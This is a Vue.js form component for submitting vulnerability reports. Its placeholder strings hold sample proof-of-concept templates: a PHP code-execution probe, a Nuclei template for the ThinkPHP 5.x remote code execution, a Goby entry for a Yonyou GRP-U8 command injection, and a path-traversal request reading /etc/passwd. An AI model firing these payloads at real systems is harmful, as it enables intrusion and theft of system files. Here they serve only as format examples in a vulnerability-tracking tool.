<template>
    <el-card style="width: 70%; margin: auto; font-weight: bold; font-size: 20px;" shadow="always" :header="t('app.webui.vulninfo')">
        <div style="font-weight: lighter; font-size: 17px;">
            <el-form inline="true" :model="form" label-width="auto" size="large">
            <el-form-item :label="t('app.webui.vulnname')" prop="vuln_name" style="width: 45%" :rules="[{ required: true, message: t('app.webui.required') },]">
                <el-input v-model="form.vuln_name" />
            </el-form-item>
            <el-form-item :label="t('app.webui.vulntype')" style="width: 45%" required>
                <el-select v-model="form.vuln_type_id" :placeholder="t('el.select.placeholder')">
                    <el-option v-for="item in vulntype" :key="item.id" :label="item.name" :value="item.id" />
                </el-select>
            </el-form-item>
            <el-form-item :label="t('app.webui.affectedproduct')" prop="affected_product" style="width: 45%" :rules="[{ required: true, message: t('app.webui.required') },]">
                <el-input v-model="form.affected_product" />
            </el-form-item>
            <el-form-item :label="t('app.webui.productversion')" style="width: 45%" prop="affected_product_version" :rules="[{ required: true, message: t('app.webui.required') },]">
                <el-input v-model="form.affected_product_version" />
            </el-form-item>
            <el-form-item label="CVSS" style="width: 29%" required>
                <el-input v-model="form.cvss" type="number" step="0.1" @change="ShowVlunLevel" />
            </el-form-item>
            <el-form-item :label="t('app.webui.vulnlevel')" style="width: 29%" required>
                <el-input v-model="vulnlevel" readonly disabled />
            </el-form-item>
            <el-form-item :label="t('app.webui.ispublic')" style="width: 29%">
                <el-switch v-model="form.is_public" />
            </el-form-item>
            <el-form-item :label="t('app.webui.cveid')" style="width: 29%">
                <el-input v-model="form.cve" />
            </el-form-item>
            <el-form-item :label="t('app.webui.nvdid')" style="width: 29%">
                <el-input v-model="form.nvd" />
            </el-form-item>
            <el-form-item :label="t('app.webui.edbid')" style="width: 29%">
                <el-input v-model="form.edbid" />
            </el-form-item>
            <el-form-item :label="t('app.webui.cnnvdid')" style="width: 29%">
                <el-input v-model="form.cnnvd" />
            </el-form-item>
            <el-form-item :label="t('app.webui.cnvdid')" style="width: 29%">
                <el-input v-model="form.cnvd" />
            </el-form-item>
            <el-form-item :label="`Fofa ${t('app.webui.searchquery')}`" style="width: 45%">
                <el-input v-model="form.fofa_query" />
            </el-form-item>
            <el-form-item :label="`ZoomEye ${t('app.webui.searchquery')}`" style="width: 45%">
                <el-input v-model="form.zoom_eye_query" />
            </el-form-item>
            <el-form-item :label="`Quake ${t('app.webui.searchquery')}`" style="width: 45%">
                <el-input v-model="form.quake_query" />
            </el-form-item>
            <el-form-item :label="`Hunter ${t('app.webui.searchquery')}`" style="width: 45%">
                <el-input v-model="form.hunter_query" />
            </el-form-item>
            <el-form-item :label="`Google ${t('app.webui.searchquery')}`" style="width: 45%">
                <el-input v-model="form.google_query" />
            </el-form-item>
            <el-form-item :label="`Shodan ${t('app.webui.searchquery')}`" style="width: 45%">
                <el-input v-model="form.shodan_query" />
            </el-form-item>
            <el-form-item :label="`Censys ${t('app.webui.searchquery')}`" style="width: 45%">
                <el-input v-model="form.censys_query" />
            </el-form-item>
            <el-form-item :label="`Greynoise ${t('app.webui.searchquery')}`" style="width: 45%">
                <el-input v-model="form.greynoise_query" />
            </el-form-item>
            <el-form-item :label="t('app.webui.vulndesc')" style="width: 90%" prop="description" :rules="[{ required: true, message: t('app.webui.required') },]">
                <el-input v-model="form.description" type="textarea" autosize />
            </el-form-item>
            
            <el-form-item :label="t('app.webui.vulnsuggest')" style="width: 90%" prop="repair_suggestion" :rules="[{ required: true, message: t('app.webui.required') },]">
                <el-input v-model="form.repair_suggestion" type="textarea" autosize />
            </el-form-item>
            <el-form-item label="Poc" style="width: 90%" @change="ShowPocInput">
                <el-radio-group v-model="poc" size="large">
                    <el-radio-button label="Xray" value="xray" />
                    <el-radio-button label="Nuclei" value="nuclei" />
                    <el-radio-button label="Goby" value="goby" />
                    <el-radio-button :label="t('app.webui.other')" value="other" />
                </el-radio-group>
                <el-input v-model="form.poc" type="textarea" :placeholder="pocplaceholder" autosize style="margin-top: 2%;" />
            </el-form-item>
            <el-form-item label="Exp" style="width: 90%"  @change="ShowExpInput">
                <el-radio-group v-model="exp" size="large">
                    <el-radio-button label="Xray" value="xray" />
                    <el-radio-button label="Nuclei" value="nuclei" />
                    <el-radio-button label="Goby" value="goby" />
                    <el-radio-button :label="t('app.webui.other')" value="other" />
                </el-radio-group>
                <el-input v-model="form.exp" type="textarea" :placeholder="expplaceholder" autosize style="margin-top: 2%;" />
            </el-form-item>
            
            <el-form-item :label="t('app.webui.attachfile')" style="width: 100%">
                <el-upload class="upload-demo" drag accept=".zip,.doc,.docx,.pdf,.txt" action="/api/v1/upload" :headers="{'Authorization': `Bearer ${token}`}" :on-success="handleSuccess" :on-remove="handleRemove" style="width: 90%">
                    <el-icon class="el-icon--upload"><upload-filled /></el-icon>
                    <div class="el-upload__text">
                        {{ t('app.webui.draguplaod') }} <em>{{ t('app.webui.clickupload') }}</em>
                    </div>
                    <template #tip>
                    <div class="el-upload__tip">
                        {{  t('app.webui.uploadnotice1') }}
                    </div>
                    </template>
                </el-upload>
            </el-form-item>
            <el-form-item style="width: 100%;  margin-left: 35%;">
                <el-button v-if="showback" size="large" @click="goBack" style="width: 30%; font-size: 16px;" auto-insert-space>{{ t('app.webui.back') }}</el-button>
                <el-button type="primary" size="large" @click="onSubmit" style="width: 30%; font-size: 16px;" auto-insert-space>{{ t('app.webui.submitvuln') }}</el-button>
            </el-form-item>
            </el-form>
        </div>
    </el-card>
</template>
<script lang="ts" setup>
    import { ref } from 'vue'
    import { UploadFilled } from '@element-plus/icons-vue'
    import { useRoute, useRouter } from 'vue-router'
    import { onMounted } from 'vue';
    import { useI18n } from 'vue-i18n';
    import api from '../api'
    import { checkLogin } from '../utils'

    const { t } = useI18n()
    const route = useRoute();
    const router = useRouter()
    const token = sessionStorage.getItem('token')
    const url = ref('/api/v1/addvuln')
    const showback = ref(false)
    const poc = ref('xray')
    const exp = ref('xray')
    const vulntype = ref([])
    const mountedFunctions = [checkLogin,getVulnTypes,checkFrom]
    const xraypoc = `name: poc-yaml-test-php-rce
manual: true
transport: http
set:
  s1: randomInt(100000000, 200000000)
  s2: randomInt(10000, 20000)
rules:
  r0:
    request:
      cache: true
      method: POST
      path: /index.php
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: <?={{s2}}-{{s1}};
    expression: response.status == 200 && response.body_string.contains(string(s2 - s1))
expression: r0()
detail:
  author: test
  links:
    - https://test.com`
    const nucleitemp = `id: thinkphp-5022-rce

info:
  name: ThinkPHP - Remote Code Execution
  author: dr_set
  severity: critical
  description: ThinkPHP 5.0.22 and 5.1.29 are susceptible to remote code execution if the website doesn't have mandatory routing enabled, which is the default setting. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
  reference: https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5-rce
  metadata:
    max-request: 1
  tags: thinkphp,rce

http:
  - method: GET
    path:
      - "{{BaseURL}}?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "PHP Extension"
          - "PHP Version"
          - "ThinkPHP"
        condition: and

      - type: status
        status:
          - 200

# digest: 4b0a00483046022100ee65575ab1901e3f23b7c1891b8a08b0b6e5593256533a8450d227df88ab679d022100920cc2dba8c2ffb1ae53faa6ff927fe673b15ef8d2326504825b870f6d398cd5:922c64590222798bb761d5b6d8e72950`
    const gobypoc = `{
  "Name": "Yonyou GRP-U8 RCE with SQLi",
  "Description": "用友GRP-U8行政事业财务管理软件是用友公司专注于国家电子政务事业，基于云计算技术所推出的新一代产品。当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。",
  "Product": "Yonyou-GRP-U8",
  "Homepage": "https://www.yonyou.com/",
  "DisclosureDate": "2020-09-11",
  "Author": "itardc@163.com",
  "FofaQuery": "app=\"Yonyou-GRP-U8\"",
  "Level": "3",
  "Impact": "当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击",
  "Recommendation": "官方已发布针对此漏洞的修复补丁。",
  "References": [
    "https://nosec.org/home/detail/4561.html"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "cmd",
      "type": "input",
      "value": "whoami"
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": null,
  "ExploitSteps": null,
  "Tags": ["rce", "sqli"],
  "CVEIDs": null,
  "CVSSScore": null,
  "AttackSurfaces": {
    "Application": ["Yonyou-GRP-U8"],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`
    const otherpoc = `POST /v1/app/readFileSync HTTP/1.1
Host: {{Host}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://<IP>:<Port>
contentType: application/json
Content-Type: text/plain;charset=UTF-8
Content-Length: 48
Origin: http://<IP>:<Port>
Connection: close

["file:/../../../../../../etc/passwd","utf-8"]`
    const pocplaceholder = ref(xraypoc)
    const expplaceholder = ref(xraypoc)
    const vulnlevel = ref('--')
    const form = ref({
        vuln_name: '',
        vuln_type_id: 1,
        cvss: 0.1,
        vuln_level: '',
        cve: '',
        nvd: '',
        edb: '',
        cnnvd: '',
        cnvd: '',
        affected_product: '',
        repair_suggestion: '',
        poc: '',
        exp: '',
        poc_type: poc.value,
        exp_type: exp.value,
        is_public: false,
        description: '',
        fofa_query: '',
        zoom_eye_query: '',
        quake_query: '',
        hunter_query: '',
        google_query: '',
        shodan_query: '',
        censys_query: '',
        greynoise_query: '',
        attachment_id: '',
        affected_product_version: '',
    })
    
    onMounted(() => {
        mountedFunctions.forEach(fn => {
            fn();
        });
    });
    function checkFrom () {
        const id = route.query.id
        if (route.redirectedFrom.path === '/myvulns') {
            const data = JSON.parse(localStorage.getItem('form'))
            if (data.id === id) {
                form.value = data
                url.value = '/api/v1/editvuln'
            }
            showback.value = true
        } else {
            localStorage.removeItem('form')
        }
    }
    
    function goBack() {
        localStorage.removeItem('form')
        router.back()
        //router.push('/myvulns')
    }
    async function getVulnTypes() {
        try {
            const response = await api.get('/api/v1/getvulntypes')
            vulntype.value = response.data.data
        } catch (error) {
            //console.error(error)
        }
    }
    
    const ShowVlunLevel = () => {
        form.value.cvss = Number(form.value.cvss)
        if (form.value.cvss > 0 && form.value.cvss < 4) {
            form.value.vuln_level = 'Low'
            vulnlevel.value = t('app.webui.low')
            return
        } else if (form.value.cvss >= 4 && form.value.cvss < 7) {
            form.value.vuln_level = 'Medium'
            vulnlevel.value = t('app.webui.medium')
            return
        } else if (form.value.cvss >= 7 && form.value.cvss < 9) {
            form.value.vuln_level = 'High'
            vulnlevel.value = t('app.webui.high')
            return
        } else if (form.value.cvss >= 9 && form.value.cvss <= 10) {
            form.value.vuln_level = 'Critical'
            vulnlevel.value = t('app.webui.critical')
            return
        } else {
            ElMessage.error(t('app.webui.cvsserror'))
        }
    }
    const ShowPocInput = () => {
        form.value.poc_type = poc.value
        if (poc.value == 'xray') {
            pocplaceholder.value = xraypoc
        } else if (poc.value == 'nuclei') {
            pocplaceholder.value = nucleitemp
        } else if (poc.value == 'goby') {
            pocplaceholder.value = gobypoc
        } else {
            pocplaceholder.value = otherpoc
        }
    }

    const ShowExpInput = () => {
        form.value.exp_type = exp.value
        if (exp.value == 'xray') {
            expplaceholder.value = xraypoc
        } else if (exp.value == 'nuclei') {
            expplaceholder.value = nucleitemp
        } else if (exp.value == 'goby') {
            expplaceholder.value = gobypoc
        } else {
            expplaceholder.value = otherpoc
        }
    }

    const submitSuccess = () => {
        ElMessageBox.confirm(
            t('app.webui.submitsuccessnotice'),
            t('app.webui.submitsuccess'),
            {
                confirmButtonText: t('el.datepicker.confirm'),
                cancelButtonText: t('el.datepicker.cancel'),
                type: 'success',
            }
        )
        .then(() => {
            router.push('/')
        })
        .catch(() => {
            location.reload()
        })
    }
    
    const handleSuccess = (response) => {
        //console.log(response.file_id)
        form.value.attachment_id = response.file_id
    }
    const handleRemove = async () => {
        //console.log("删除文件")
        try {
            const config = {
                headers: {
                    'Authorization': `Bearer ${token}`  // 使用Bearer schema
                }
            };
            const response = await api.get('/delete/file?id=' + form.value.attachment_id, config)
            form.value.attachment_id = ''
        } catch (error) {
            // 处理请求错误
            //console.error(error);
        }
    }
    const onSubmit = async () => {
        //console.log(form.value)
        try {
            const config = {
                headers: {
                    'Authorization': `Bearer ${token}`  // 使用Bearer schema
                }
            };
            const response = await api.post(url.value, form.value, config)
            if (response.data.code == 0) {
                sessionStorage.removeItem('token')
                sessionStorage.removeItem('username')
                sessionStorage.removeItem('avatar')
                location.reload()
            } else if (response.data.code == 1) {
                submitSuccess()
            } else {
                ElMessage.error(t('app.webui.submitfailnotice'))
            }
        } catch (error) {
            // 处理请求错误
            console.error(error);
        }
    }
</script>
<style scoped>
</style>